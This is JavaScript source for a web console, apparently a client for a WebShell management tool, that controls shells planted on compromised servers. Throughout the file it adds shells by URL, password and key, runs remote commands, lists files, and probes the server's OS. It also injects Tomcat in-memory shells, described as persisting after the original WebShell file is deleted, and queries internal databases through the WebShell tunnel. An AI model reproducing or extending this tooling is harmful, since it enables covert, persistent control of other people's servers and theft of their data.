/* gsl5.js — GSL5 控制台 (WebShell 管理增强 + 内存马 + 数据库) v2 20261005-2 */
(function () {
  'use strict';

  // ---------- 样式注入 ----------
  function injectStyle() {
    if (document.getElementById('gsl5-style')) return;
    var css = `
      .gsl5-conn-badge{display:inline-block;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600}
      .gsl5-conn-badge.gsl5-ok{background:rgba(34,197,94,.15);color:#22c55e;border:1px solid rgba(34,197,94,.4)}
      .gsl5-conn-badge.gsl5-bad{background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.4)}
      .gsl5-tabs{display:flex;gap:6px;border-bottom:1px solid var(--border,#2a3644);padding-bottom:8px;margin-bottom:14px;flex-wrap:wrap}
      .gsl5-tab{background:none;border:1px solid transparent;color:var(--muted,#8b98a9);padding:7px 16px;border-radius:8px;cursor:pointer;font-size:13px}
      .gsl5-tab:hover{background:rgba(77,163,255,.08);color:var(--text,#d5dee8)}
      .gsl5-tab--active{background:rgba(77,163,255,.15);color:var(--primary,#4da3ff);border-color:rgba(77,163,255,.3)}
      .gsl5-toolbar{display:flex;gap:8px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
      .gsl5-shell-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:10px}
      .gsl5-shell-card{background:var(--card-bg,#1b2430);border:1px solid var(--border,#2a3644);border-radius:10px;padding:12px 14px;cursor:pointer;transition:border-color .15s;position:relative}
      .gsl5-shell-card:hover{border-color:var(--primary,#4da3ff)}
      .gsl5-shell-card.gsl5-sel{border-color:var(--primary,#4da3ff);background:rgba(77,163,255,.07)}
      .gsl5-shell-url{font-size:13px;font-weight:600;color:var(--text,#d5dee8);word-break:break-all;padding-right:70px}
      .gsl5-shell-meta{font-size:12px;color:var(--muted,#8b98a9);margin-top:4px;display:flex;gap:10px;flex-wrap:wrap}
      .gsl5-shell-id{font-size:11px;color:var(--muted,#8b98a9);margin-top:6px;font-family:monospace;word-break:break-all}
      .gsl5-card-ops{position:absolute;top:8px;right:8px;display:flex;gap:4px}
      .gsl5-card-op{padding:2px 8px;font-size:11px;border-radius:6px;cursor:pointer;background:rgba(77,163,255,.1);color:var(--primary,#4da3ff);border:1px solid rgba(77,163,255,.25)}
      .gsl5-card-op.gsl5-op-del{background:rgba(239,68,68,.1);color:#ef4444;border-color:rgba(239,68,68,.3)}
      .gsl5-card-op:hover{filter:brightness(1.3)}
      .gsl5-exec-box{display:flex;flex-direction:column;gap:8px}
      .gsl5-exec-output{background:#0d1420;border:1px solid var(--border,#2a3644);border-radius:8px;padding:12px;min-height:320px;max-height:520px;overflow:auto;font-family:Consolas,Menlo,monospace;font-size:12.5px;color:#c8d6e5;white-space:pre-wrap;word-break:break-all;line-height:1.55}
      .gsl5-exec-input-row{display:flex;gap:8px}
      .gsl5-exec-input-row input{flex:1}
      .gsl5-create-form{display:flex;flex-direction:column;gap:10px;max-width:560px}
      .gsl5-create-row{display:flex;align-items:center;gap:10px}
      .gsl5-create-row label{min-width:80px;font-size:13px;color:var(--muted,#8b98a9)}
      .gsl5-create-row input,.gsl5-create-row select{flex:1}
      .gsl5-os-group{margin-bottom:12px}
      .gsl5-os-group-title{font-size:13px;font-weight:700;color:var(--text,#d5dee8);margin-bottom:8px;padding:6px 10px;background:rgba(77,163,255,.08);border-radius:6px}
      .gsl5-os-badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:600}
      .gsl5-os-badge.gsl5-os-win{background:rgba(77,163,255,.15);color:#4da3ff}
      .gsl5-os-badge.gsl5-os-linux{background:rgba(240,178,60,.15);color:#f0b23c}
      .gsl5-os-badge.gsl5-os-unk{background:rgba(139,152,169,.15);color:#8b98a9}
      .gsl5-quick-path{padding:3px 10px;font-size:12px;margin-right:6px;margin-bottom:4px}
      #gsl5-file-osbar{display:flex;align-items:center;flex-wrap:wrap;gap:4px;margin-bottom:10px;padding:8px 10px;background:rgba(77,163,255,.05);border:1px solid var(--border,#2a3644);border-radius:8px}
      .gsl5-addform{display:none;flex-direction:column;gap:8px;max-width:640px;margin-bottom:12px;padding:12px;border:1px dashed var(--border,#2a3644);border-radius:10px}
      .gsl5-addform.gsl5-open{display:flex}
      .gsl5-add-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
      .gsl5-add-grid .form-control{width:100%}
      .gsl5-note{font-size:12px;color:var(--muted,#8b98a9);line-height:1.6}
      .gsl5-ms-ok{color:#22c55e;font-weight:700}
    `;
    var st = document.createElement('style');
    st.id = 'gsl5-style';
    st.textContent = css;
    document.head.appendChild(st);
  }

  // ---------- 状态 ----------
  var curShellId = '';
  var shells = [];
  var osProbing = {}; // id -> true (探测中)
  var osCache = {};   // id -> 'win' | 'linux' | 'unknown'
  var msLast = null;  // 最近一次注入内存马的参数 {shellId,url,password,secretKey}
  var QUICK_PATHS = {
    win:   ['C:\\', 'C:\\Windows\\Temp', 'C:\\inetpub\\wwwroot', 'C:\\phpstudy_pro\\WWW', 'C:\\xampp\\htdocs'],
    linux: ['/', '/tmp', '/var/www/html', '/var/www', '/home', '/root']
  };
  function osBadgeHtml(os) {
    if (os === 'win')  return '<span class=\"gsl5-os-badge gsl5-os-win\">🪟 Windows</span>';
    if (os === 'linux') return '<span class=\"gsl5-os-badge gsl5-os-linux\">🐧 Linux</span>';
    return '<span class=\"gsl5-os-badge gsl5-os-unk\">❓ 未知</span>';
  }
  function osDefaultPath(os) { return os === 'win' ? 'C:\\' : '/'; }

  function api(path, opts) {
    return apiFetch(path, opts || {});
  }

  function callTool(tool, args, outEl, loadingText) {
    if (outEl && loadingText) outEl.textContent = loadingText;
    return api('/api/gsl5/tools', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: tool, args: args || {} })
    }).then(function (r) { return r.json(); }).then(function (d) {
      var txt = d.error ? ('错误: ' + d.error) : ((d && d.content) || '(无返回)');
      if (outEl) outEl.textContent = txt;
      return txt;
    }).catch(function (e) {
      if (outEl) outEl.textContent = '调用失败: ' + (e.message || e);
      return null;
    });
  }

  // ---------- 状态徽标 ----------
  window.gsl5RefreshStatus = function () {
    var badge = document.getElementById('gsl5-conn-badge');
    if (!badge) return;
    badge.textContent = '查询中…';
    badge.className = 'gsl5-conn-badge';
    api('/api/gsl5/status').then(function (r) { return r.json(); }).then(function (d) {
      if (d && d.status === 'connected') {
        badge.textContent = 'GSL5 已连接 · ' + (d.tool_count || 0) + ' 工具';
        badge.className = 'gsl5-conn-badge gsl5-ok';
      } else {
        badge.textContent = 'GSL5 未连接';
        badge.className = 'gsl5-conn-badge gsl5-bad';
      }
    }).catch(function () {
      badge.textContent = 'GSL5 状态未知';
      badge.className = 'gsl5-conn-badge gsl5-bad';
    });
  };

  // ---------- 动态注入新 Tab + Panel (v2: 内存马/数据库, 免重启 index.html) ----------
  var TAB_IDS = ['shells', 'exec', 'files', 'create', 'memshell', 'db'];
  function injectExtraPanels() {
    if (document.getElementById('gsl5-panel-memshell')) return;
    var tabs = document.querySelector('.gsl5-tabs');
    var anchor = document.getElementById('gsl5-panel-create');
    if (!tabs || !anchor) return;
    function mkTab(id, label) {
      var b = document.createElement('button');
      b.type = 'button'; b.className = 'gsl5-tab';
      b.setAttribute('data-gsl5-tab', id);
      b.onclick = function () { window.gsl5SwitchTab(id); };
      b.textContent = label;
      return b;
    }
    tabs.appendChild(mkTab('memshell', '内存马'));
    tabs.appendChild(mkTab('db', '数据库'));

    var ms = document.createElement('div');
    ms.id = 'gsl5-panel-memshell'; ms.className = 'gsl5-panel'; ms.style.display = 'none';
    ms.innerHTML =
      '<div class="gsl5-toolbar">' +
        '<select id="gsl5-ms-shell" class="form-control" style="max-width:330px"><option value="">— 选择 Shell —</option></select>' +
        '<select id="gsl5-ms-type" class="form-control" style="max-width:310px" onchange="gsl5MsTypeChange()">' +
          '<option value="TOMCAT_VALVE_AES_BASE64">Valve 型 (推荐·兼容 SpringBoot 内嵌 Tomcat)</option>' +
          '<option value="TOMCAT_FILTER_AES_BASE64">Filter 型</option>' +
          '<option value="TOMCAT_VALVE_AES_BASE64_PROFILE">Valve + C2Profile 伪装 (服务端需 JDK)</option>' +
          '<option value="TOMCAT_FILTER_AES_BASE64_PROFILE">Filter + C2Profile (服务端需 JDK)</option>' +
        '</select>' +
        '<input type="text" id="gsl5-ms-profile" class="form-control" style="max-width:200px;display:none" placeholder="C2 Profile 名" />' +
      '</div>' +
      '<div class="gsl5-toolbar">' +
        '<input type="text" id="gsl5-ms-pass" class="form-control" style="max-width:170px" placeholder="内存马密码" />' +
        '<input type="text" id="gsl5-ms-key" class="form-control" style="max-width:190px" placeholder="密钥原文(自动md5前16)" />' +
        '<input type="text" id="gsl5-ms-cls" class="form-control" style="max-width:220px" placeholder="类名(可选,默认 x.<TYPE>)" />' +
        '<button type="button" class="btn-primary" onclick="gsl5MsInject()">★ 注入内存马</button>' +
        '<button type="button" class="btn-secondary" onclick="gsl5MsList()">类型说明</button>' +
      '</div>' +
      '<div class="gsl5-note" style="margin-bottom:8px">对已控 Java Shell 注入 Tomcat 内存马; 注入成功后原 WebShell 文件可删除, 内存马常驻 JVM。注入完成后点「一键连接」直接纳管。</div>' +
      '<div id="gsl5-ms-output" class="gsl5-exec-output">选择 Java(JavaDynamicPayload) Shell 后注入内存马</div>';
    anchor.parentNode.insertBefore(ms, anchor.nextSibling);

    var db = document.createElement('div');
    db.id = 'gsl5-panel-db'; db.className = 'gsl5-panel'; db.style.display = 'none';
    db.innerHTML =
      '<div class="gsl5-toolbar">' +
        '<select id="gsl5-db-shell" class="form-control" style="max-width:300px"><option value="">— 选择 Shell —</option></select>' +
        '<select id="gsl5-db-type" class="form-control" style="max-width:130px">' +
          '<option>mysql</option><option>sqlserver</option><option>oracle</option><option>postgresql</option><option>sqlite</option>' +
        '</select>' +
        '<input type="text" id="gsl5-db-host" class="form-control" style="max-width:150px" placeholder="127.0.0.1" />' +
        '<input type="text" id="gsl5-db-port" class="form-control" style="max-width:80px" placeholder="端口" />' +
        '<input type="text" id="gsl5-db-user" class="form-control" style="max-width:120px" placeholder="用户" />' +
        '<input type="password" id="gsl5-db-pass" class="form-control" style="max-width:120px" placeholder="密码" />' +
        '<button type="button" class="btn-primary" onclick="gsl5DbConnect()">连接</button>' +
        '<button type="button" class="btn-secondary" onclick="gsl5DbConfigs()">已存连接</button>' +
      '</div>' +
      '<div class="gsl5-toolbar">' +
        '<input type="text" id="gsl5-db-name" class="form-control" style="max-width:170px" placeholder="库名(列库后填)" />' +
        '<button type="button" class="btn-secondary" onclick="gsl5DbDatabases()">列库</button>' +
        '<input type="text" id="gsl5-db-table" class="form-control" style="max-width:170px" placeholder="表名" />' +
        '<button type="button" class="btn-secondary" onclick="gsl5DbTables()">列表</button>' +
        '<button type="button" class="btn-secondary" onclick="gsl5DbPreview()">预览10行</button>' +
        '<button type="button" class="btn-secondary" onclick="gsl5DbCount()">行数</button>' +
      '</div>' +
      '<div class="gsl5-exec-input-row" style="margin-bottom:8px">' +
        '<input type="text" id="gsl5-db-sql" class="form-control" placeholder="SQL: select * from user limit 10" onkeydown="if(event.key===\'Enter\')gsl5DbExec()" />' +
        '<button type="button" class="btn-primary" onclick="gsl5DbExec()">执行 SQL</button>' +
      '</div>' +
      '<div id="gsl5-db-output" class="gsl5-exec-output">选择 Shell → 填内网库信息(经 WebShell 隧道连接) → 连接后列库/执行 SQL</div>';
    anchor.parentNode.insertBefore(db, ms.nextSibling);

    // Shell 列表页: 添加 Shell 折叠表单
    var shellPanel = document.getElementById('gsl5-panel-shells');
    if (shellPanel) {
      var addForm = document.createElement('div');
      addForm.id = 'gsl5-addform'; addForm.className = 'gsl5-addform';
      addForm.innerHTML =
        '<div class="gsl5-add-grid">' +
          '<input type="text" id="gsl5-add-url" class="form-control" placeholder="URL http://target/shell.jsp (必填)" />' +
          '<input type="text" id="gsl5-add-pass" class="form-control" placeholder="密码 (必填)" />' +
          '<input type="text" id="gsl5-add-key" class="form-control" placeholder="密钥 (必填)" />' +
          '<select id="gsl5-add-payload" class="form-control"><option>JavaDynamicPayload</option><option>CSharpDynamicPayload</option><option>PhpDynamicPayload</option><option>AspDynamicPayload</option></select>' +
          '<select id="gsl5-add-cryption" class="form-control"><option>JAVA_AES_BASE64</option><option>JAVA_AES_RAW</option><option>JAVA_GZIP</option><option>CSHARP_AES_BASE64</option><option>PHP_XOR_BASE64</option><option>ASP_XOR_BASE64</option></select>' +
          '<input type="text" id="gsl5-add-remark" class="form-control" placeholder="备注(可选)" />' +
          '<input type="text" id="gsl5-add-enc" class="form-control" placeholder="编码, 默认 Auto" />' +
        '</div>' +
        '<div><button type="button" class="btn-primary" onclick="gsl5AddShell()">添加 (仅保存配置并测试)</button></div>';
      var toolbar = shellPanel.querySelector('.gsl5-toolbar');
      if (toolbar) {
        var addBtn = document.createElement('button');
        addBtn.type = 'button'; addBtn.className = 'btn-secondary';
        addBtn.textContent = '＋ 添加 Shell';
        addBtn.onclick = function () { addForm.classList.toggle('gsl5-open'); };
        toolbar.appendChild(addBtn);
        toolbar.parentNode.insertBefore(addForm, toolbar.nextSibling);
      }
    }

    // 修复 create 面板错误的 PhpPayload 选项
    var cp = document.getElementById('gsl5-create-payload');
    if (cp) {
      Array.prototype.forEach.call(cp.options, function (o) {
        if (o.value === 'PhpPayload') { o.value = 'PhpDynamicPayload'; o.textContent = 'PhpDynamicPayload'; }
      });
    }
  }

  // ---------- Tab 切换 ----------
  window.gsl5SwitchTab = function (tab) {
    document.querySelectorAll('.gsl5-tab').forEach(function (t) {
      t.classList.toggle('gsl5-tab--active', t.getAttribute('data-gsl5-tab') === tab);
    });
    TAB_IDS.forEach(function (t) {
      var el = document.getElementById('gsl5-panel-' + t);
      if (el) el.style.display = (t === tab) ? '' : 'none';
    });
    if (tab === 'shells') window.gsl5LoadShells();
    if (tab === 'exec' || tab === 'memshell' || tab === 'db') window.gsl5SyncShellSelects();
    if (tab === 'files') { window.gsl5SyncShellSelects(); window.gsl5SyncFileOsBar(); }
  };

  // ---------- Shell 列表 ----------
  window.gsl5LoadShells = function () {
    var listEl = document.getElementById('gsl5-shell-list');
    if (!listEl) return;
    listEl.innerHTML = '<div class="supply-empty">加载中…</div>';
    api('/api/gsl5/shells').then(function (r) { return r.json(); }).then(function (d) {
      var text = (d && d.content) || '';
      shells = [];
      // 过滤表头行（GSL5 shell_list 无 shell 时仅返回 "id | url | encoding+proxyType" 表头）
      var lines = text.split('\n').filter(function (l) { var t = l.trim(); return t && !/^id\s*\|\s*url/i.test(t); });
      if (!lines.length) {
        listEl.innerHTML = '<div class="supply-empty">暂无 WebShell, 切到「Shell 生成」或「＋ 添加 Shell」</div>';
        return;
      }
      lines.forEach(function (line) {
        var parts = line.split('|').map(function (s) { return s.trim(); });
        shells.push({ id: parts[0] || '', url: parts[1] || '', enc: parts[2] || '', os: osCache[parts[0]] || '' });
      });
      // 按 OS 分组
      function cardHtml(s) {
        return '<div class="gsl5-shell-card' + (s.id === curShellId ? ' gsl5-sel' : '') + '" onclick="gsl5SelectShell(\'' + s.id + '\', this)">' +
          '<div class="gsl5-card-ops">' +
            '<span class="gsl5-card-op" title="测试连接" onclick="event.stopPropagation();gsl5CardTest(\'' + s.id + '\')">⟳</span>' +
            '<span class="gsl5-card-op gsl5-op-del" title="删除" onclick="event.stopPropagation();gsl5CardDel(\'' + s.id + '\')">✕</span>' +
          '</div>' +
          '<div class="gsl5-shell-url">' + esc(s.url || s.id) + '</div>' +
          '<div class="gsl5-shell-meta" id="gsl5-meta-' + s.id + '">' + osBadgeHtml(s.os) + '<span>' + esc(s.enc || '未知编码') + '</span></div>' +
          '<div class="gsl5-shell-id">' + esc(s.id) + '</div>' +
        '</div>';
      }
      var gWin = [], gLin = [], gUnk = [];
      shells.forEach(function (s) {
        if (s.os === 'win') gWin.push(s);
        else if (s.os === 'linux') gLin.push(s);
        else gUnk.push(s);
      });
      function renderGroup(title, list) {
        if (!list.length) return '';
        return '<div class="gsl5-os-group"><div class="gsl5-os-group-title">' + title + ' (' + list.length + ')</div>' +
          '<div class="gsl5-shell-list">' + list.map(cardHtml).join('') + '</div></div>';
      }
      listEl.innerHTML = renderGroup('🪟 Windows', gWin) + renderGroup('🐧 Linux', gLin) + renderGroup('❓ 未识别', gUnk);
      // 批量探测系统类型(shell_info)
      shells.forEach(function (s) {
        if (!s.os && !osProbing[s.id]) window.gsl5ProbeOs(s.id);
      });
    }).catch(function (e) {
      listEl.innerHTML = '<div class="supply-empty">加载失败: ' + esc(e.message || e) + '</div>';
    });
  };

  // 卡片操作: 测试 / 删除
  window.gsl5CardTest = function (id) {
    var meta = document.getElementById('gsl5-meta-' + id);
    if (meta) meta.innerHTML = '<span>测试中…</span>';
    api('/api/gsl5/tools', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_test', args: { shellId: id } })
    }).then(function (r) { return r.json(); }).then(function (d) {
      var ok = d && d.content && d.content.indexOf('连接测试成功') >= 0;
      var sh = shells.filter(function (s) { return s.id === id; })[0] || {};
      if (meta) meta.innerHTML = osBadgeHtml(sh.os) + (ok ? '<span class="gsl5-ms-ok">✓ 连接正常</span>' : '<span style="color:#ef4444">✗ ' + esc(((d && (d.error || d.content)) || '失败').slice(0, 40)) + '</span>');
    });
  };
  window.gsl5CardDel = function (id) {
    if (!window.confirm('删除该 Shell 配置? (仅删 GSL5 配置, 不动目标文件)')) return;
    callTool('shell_delete', { shellId: id }, null).then(function () { window.gsl5LoadShells(); });
  };
  window.gsl5AddShell = function () {
    var url = val('gsl5-add-url'), pass = val('gsl5-add-pass'), key = val('gsl5-add-key');
    if (!url || !pass || !key) { alert('URL / 密码 / 密钥 必填'); return; }
    var args = { url: url, password: pass, secretKey: key, payload: val('gsl5-add-payload') || 'JavaDynamicPayload', cryption: val('gsl5-add-cryption') || 'JAVA_AES_BASE64', remark: val('gsl5-add-remark') || '' };
    var enc = val('gsl5-add-enc'); if (enc) args.encoding = enc;
    api('/api/gsl5/tools', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_add', args: args })
    }).then(function (r) { return r.json(); }).then(function (d) {
      alert(d.error ? ('添加失败: ' + d.error) : (d.content || '完成'));
      if (!d.error) { document.getElementById('gsl5-addform').classList.remove('gsl5-open'); window.gsl5LoadShells(); }
    });
  };

  // ---------- 选择 Shell ----------
  window.gsl5SelectShell = function (id, el) {
    curShellId = id;
    document.querySelectorAll('.gsl5-shell-card').forEach(function (c) { c.classList.remove('gsl5-sel'); });
    if (el) el.classList.add('gsl5-sel');
    window.gsl5SyncShellSelects();
    window.gsl5SyncFileOsBar();
    if (!osCache[id] && !osProbing[id]) window.gsl5ProbeOs(id);
  };

  // ---------- OS 探测(按 shell_info 内容识别 Windows/Linux) ----------
  window.gsl5ProbeOs = function (id) {
    if (osProbing[id]) return;
    osProbing[id] = true;
    api('/api/gsl5/tools', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_info', args: { shellId: id } })
    }).then(function (r) { return r.json(); }).then(function (d) {
      var txt = ((d && d.content) || '').toLowerCase();
      var os = 'unknown';
      if (/windows|win32|microsoft|nt kernel|cmd\.exe/i.test(txt)) os = 'win';
      else if (/linux|ubuntu|centos|debian|kali|unix|darwin|\/bin\/sh/i.test(txt)) os = 'linux';
      osCache[id] = os;
      shells.forEach(function (s) { if (s.id === id) s.os = os; });
      window.gsl5LoadShells();
      window.gsl5SyncShellSelects();
    }).catch(function () {
      osCache[id] = 'unknown';
    }).then(function () { osProbing[id] = false; });
  };

  // ---------- 快速路径(按 OS 分类) ----------
  window.gsl5QuickPath = function (p) {
    var pathEl = document.getElementById('gsl5-file-path');
    if (pathEl) pathEl.value = p;
    window.gsl5FileList();
  };

  // ---------- 文件面板: 显示当前 Shell 的 OS 与快速路径 ----------
  window.gsl5SyncFileOsBar = function () {
    var bar = document.getElementById('gsl5-file-osbar');
    if (!bar) return;
    var id = currentShellId();
    var os = (osCache[id] || '');
    var html = '<span style="margin-right:10px;">' + osBadgeHtml(os || 'unknown') + '</span>';
    var paths = QUICK_PATHS[os === 'win' ? 'win' : 'linux'];
    if (os === 'win' || os === 'linux') {
      html += paths.map(function (p) {
        return '<button type="button" class="btn-secondary gsl5-quick-path" onclick="gsl5QuickPath(\'' + p.replace(/\\/g, '\\\\') + '\')">' + esc(p) + '</button>';
      }).join('');
    } else {
      html += '<span style="font-size:12px;color:var(--muted,#8b98a9);">选择 Shell 后自动识别系统类型, 文件管理按 Windows/Linux 分类</span>';
    }
    bar.innerHTML = html;
    var pathEl = document.getElementById('gsl5-file-path');
    if (pathEl && (os === 'win' || os === 'linux')) {
      var cur = pathEl.value || '';
      if (cur === '' || cur === '/') pathEl.value = osDefaultPath(os);
    }
  };

  window.gsl5SyncShellSelects = function () {
    var opts = '<option value="">— 选择 Shell —</option>' + shells.map(function (s) {
      return '<option value="' + esc(s.id) + '"' + (s.id === curShellId ? ' selected' : '') + '>' + esc(s.url) + '</option>';
    }).join('');
    ['gsl5-exec-shell', 'gsl5-file-shell', 'gsl5-ms-shell', 'gsl5-db-shell'].forEach(function (id) {
      var el = document.getElementById(id);
      if (el) el.innerHTML = opts;
    });
  };

  function currentShellId() {
    var el = document.getElementById('gsl5-exec-shell');
    if (el && el.value) return el.value;
    return curShellId;
  }

  // ---------- 内存马 ----------
  function val(id) { var el = document.getElementById(id); return el ? String(el.value || '').trim() : ''; }
  window.gsl5MsTypeChange = function () {
    var t = val('gsl5-ms-type') || '';
    var p = document.getElementById('gsl5-ms-profile');
    if (p) p.style.display = t.indexOf('_PROFILE') >= 0 ? '' : 'none';
  };
  window.gsl5MsList = function () {
    var id = val('gsl5-ms-shell');
    if (!id) { alert('先选择 Shell'); return; }
    callTool('plugin_MemShellMcp_list', { shellId: id }, document.getElementById('gsl5-ms-output'), '查询中…');
  };
  window.gsl5MsInject = function () {
    var out = document.getElementById('gsl5-ms-output');
    var id = val('gsl5-ms-shell');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    var pass = val('gsl5-ms-pass'), key = val('gsl5-ms-key');
    if (!pass || !key) { out.textContent = '内存马密码和密钥必填'; return; }
    var sh = shells.filter(function (s) { return s.id === id; })[0] || {};
    msLast = { shellId: id, url: sh.url || '', password: pass, secretKey: key };
    var args = { shellId: id, type: val('gsl5-ms-type') || 'TOMCAT_VALVE_AES_BASE64', password: pass, secretKey: key };
    var profile = val('gsl5-ms-profile'); if (profile) args.profile = profile;
    var cls = val('gsl5-ms-cls'); if (cls) args.className = cls;
    callTool('plugin_MemShellMcp_inject', args, out, '注入中… (include + run)').then(function (txt) {
      if (txt && txt.indexOf('注入调用完成') >= 0) {
        out.innerHTML = esc(txt) + '\n\n<button type="button" class="btn-primary" style="margin-top:8px" onclick="gsl5MsConnect()">一键连接内存马</button>';
      } else {
        out.textContent = txt || '(无返回)';
      }
    });
  };
  window.gsl5MsConnect = function () {
    var out = document.getElementById('gsl5-ms-output');
    if (!msLast) return;
    out.textContent = '连接内存马中… (shell_add)';
    api('/api/gsl5/tools', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_add', args: { url: msLast.url, password: msLast.password, secretKey: msLast.secretKey, payload: 'JavaDynamicPayload', cryption: 'JAVA_AES_BASE64', remark: 'memshell' } })
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (d.error) { out.textContent = '连接失败: ' + d.error; return; }
      out.textContent = '已添加内存马连接: ' + (d.content || '') + '\n自动测试中…';
      // 解析 shell id 测试
      var m = (d.content || '').match(/[0-9a-f]{8}-[0-9a-f-]{27}/);
      if (m) {
        callTool('shell_test', { shellId: m[0] }, null).then(function (t) {
          out.textContent += '\n' + (t || '');
          window.gsl5LoadShells();
        });
      } else window.gsl5LoadShells();
    });
  };

  // ---------- 数据库 ----------
  window.gsl5DbConnect = function () {
    var out = document.getElementById('gsl5-db-output');
    var id = val('gsl5-db-shell');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    var args = { shellId: id, dbHost: val('gsl5-db-host'), dbPort: val('gsl5-db-port'), dbUser: val('gsl5-db-user'), dbPass: val('gsl5-db-pass'), dbType: val('gsl5-db-type') || 'mysql', configName: 'ui-' + id.slice(0, 8) };
    var name = val('gsl5-db-name'); if (name) args.dbName = name;
    callTool('db_connect', args, out, '连接数据库中… (经 WebShell 隧道)');
  };
  window.gsl5DbConfigs = function () {
    var id = val('gsl5-db-shell');
    if (!id) { alert('先选择 Shell'); return; }
    callTool('db_configs', { shellId: id, action: 'list' }, document.getElementById('gsl5-db-output'), '查询已存连接…');
  };
  function dbArgs() {
    var id = val('gsl5-db-shell');
    var a = { shellId: id, configName: 'ui-' + (id || '').slice(0, 8) };
    var n = val('gsl5-db-name'); if (n) { a.database = n; a.dbName = n; }
    return a;
  }
  window.gsl5DbDatabases = function () { callTool('db_databases', dbArgs(), document.getElementById('gsl5-db-output'), '列库中…'); };
  window.gsl5DbTables = function () {
    var a = dbArgs(); var t = val('gsl5-db-table'); if (t) a.table = t;
    callTool('db_tables', a, document.getElementById('gsl5-db-output'), '列表中…');
  };
  window.gsl5DbPreview = function () {
    var a = dbArgs(); var t = val('gsl5-db-table');
    if (!t) { document.getElementById('gsl5-db-output').textContent = '请填表名'; return; }
    a.table = t;
    callTool('db_preview', a, document.getElementById('gsl5-db-output'), '预览前10行…');
  };
  window.gsl5DbCount = function () {
    var a = dbArgs(); var t = val('gsl5-db-table');
    if (!t) { document.getElementById('gsl5-db-output').textContent = '请填表名'; return; }
    a.table = t;
    callTool('db_count', a, document.getElementById('gsl5-db-output'), '统计行数…');
  };
  window.gsl5DbExec = function () {
    var a = dbArgs(); var sql = val('gsl5-db-sql');
    if (!sql) { document.getElementById('gsl5-db-output').textContent = '请输入 SQL'; return; }
    a.sql = sql;
    callTool('db_exec', a, document.getElementById('gsl5-db-output'), '执行 SQL…');
  };

  // ---------- 命令执行 ----------
  window.gsl5ExecCmd = function () {
    var id = currentShellId();
    var cmdEl = document.getElementById('gsl5-exec-cmd');
    var out = document.getElementById('gsl5-exec-output');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    var cmd = cmdEl ? cmdEl.value : '';
    if (!cmd.trim()) return;
    out.textContent = '$ ' + cmd + '\n执行中…';
    api('/api/gsl5/tools', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_exec', args: { shellId: id, command: cmd, encoding: 'auto' } })
    }).then(function (r) { return r.json(); }).then(function (d) {
      if (d && d.error) { out.textContent = '错误: ' + d.error; return; }
      out.textContent = '$ ' + cmd + '\n' + (d.content || '(无输出)');
    }).catch(function (e) {
      out.textContent = '调用失败: ' + esc(e.message || e);
    });
  };

  window.gsl5ExecInfo = function () {
    var id = currentShellId();
    var out = document.getElementById('gsl5-exec-output');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    callTool('shell_info', { shellId: id }, out, '获取系统信息中…');
  };

  window.gsl5ExecTest = function () {
    var id = currentShellId();
    var out = document.getElementById('gsl5-exec-output');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    callTool('shell_test', { shellId: id }, out, '测试连接中…');
  };

  // ---------- 文件管理 ----------
  window.gsl5FileList = function () {
    var el = document.getElementById('gsl5-file-shell');
    var id = el ? el.value : '';
    var pathEl = document.getElementById('gsl5-file-path');
    var path = pathEl ? pathEl.value : '/';
    var out = document.getElementById('gsl5-file-output');
    if (!id) { out.textContent = '请先选择 Shell'; return; }
    callTool('file_list', { shellId: id, path: path }, out, '列目录 ' + path + ' …');
  };

  // ---------- Shell 生成 ----------
  window.gsl5CreateShell = function () {
    var url = document.getElementById('gsl5-create-url').value.trim();
    var pass = document.getElementById('gsl5-create-pass').value.trim();
    var key = document.getElementById('gsl5-create-key').value.trim();
    var payload = document.getElementById('gsl5-create-payload').value;
    var cryption = document.getElementById('gsl5-create-cryption').value;
    var out = document.getElementById('gsl5-create-output');
    if (!url || !pass) { out.textContent = 'URL 和密码必填'; return; }
    out.textContent = '生成中…';
    var args = { url: url, password: pass, secretKey: key, payload: payload, cryption: cryption, genFile: 'auto' };
    api('/api/gsl5/tools', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ tool: 'shell_create', args: args })
    }).then(function (r) { return r.json(); }).then(function (d) {
      out.textContent = d.error ? ('错误: ' + d.error) : (d.content || '(完成)');
    }).catch(function (e) {
      out.textContent = '调用失败: ' + esc(e.message || e);
    });
  };

  // ---------- 工具 ----------
  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (m) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[m];
    });
  }

  // ---------- 页面初始化 ----------
  window.gsl5Init = function () {
    injectStyle();
    injectExtraPanels();
    window.gsl5RefreshStatus();
    window.gsl5LoadShells();
    window.gsl5SyncShellSelects();
    window.gsl5SyncFileOsBar();
  };

  // 兼容 router 的 init 调用约定
  window.gsl5PageInit = window.gsl5Init;
})();
